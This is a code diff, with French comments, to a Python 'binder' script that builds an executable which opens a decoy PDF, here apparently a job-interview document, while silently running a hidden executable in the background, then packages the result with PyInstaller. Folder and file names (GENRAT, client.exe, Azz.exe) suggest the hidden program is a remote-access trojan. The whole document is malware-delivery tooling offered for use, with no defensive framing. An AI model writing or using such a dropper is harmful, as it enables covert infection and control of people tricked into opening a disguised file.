@@ -16,24 +16,19 @@ import os
 import subprocess
 
 def execute_and_show():
-    # Fichier visible à afficher
     file_to_show = "{input_pdf}"
-    # Fichier exécutable à lancer
     exe_to_run = "{input_exe}"
-    
-    # Ouvrir le fichier visible (PDF, DOCX, ou TXT)
+
     os.startfile(file_to_show)
-    
-    # Exécuter le fichier exécutable en arrière-plan
     subprocess.Popen(exe_to_run, shell=True)
 
 if __name__ == "__main__":
     execute_and_show()
 """
 
-    # Sauvegarder ce code temporairement
+    # Sauvegarder ce code temporairement avec encodage UTF-8
     temp_file = "temp_binder.py"
-    with open(temp_file, "w") as f:
+    with open(temp_file, "w", encoding="utf-8") as f:
         f.write(binder_code)
 
     # Convertir le script temporaire en un exécutable
@@ -45,7 +40,6 @@ if __name__ == "__main__":
     dist_folder = "dist"
     spec_file = f"{output_exe}.spec"
 
-    # Supprimer les dossiers et fichiers inutiles
     if os.path.exists(build_folder):
         shutil.rmtree(build_folder)
     if os.path.exists(spec_file):
@@ -53,14 +47,9 @@ if __name__ == "__main__":
 
     print(f"Fichier combiné '{output_exe}.exe' généré avec succès dans le dossier {dist_folder}/")
 
-# Exemple d'utilisation
 if __name__ == "__main__":
-    # Fichier visible
-    input_pdf = "document_legitime.pdf"  # Le fichier que vous voulez afficher
-    # Fichier exécutable à exécuter
-    input_exe = "client.exe"  # Le fichier .exe généré depuis votre script Python
-    # Nom de sortie
+    input_pdf = "C:\\Users\\HP\\OneDrive\\Desktop\\GENRAT\\GENRAT\\EntretienV2.pdf"
+    input_exe = "C:\\Users\\HP\\OneDrive\\Desktop\\GENRAT\\GENRAT\\dist\\Azz.exe"
     output_exe = "fichier_combiné"
 
-    # Créer l'exécutable combiné
     bind_files(input_pdf, input_exe, output_exe)
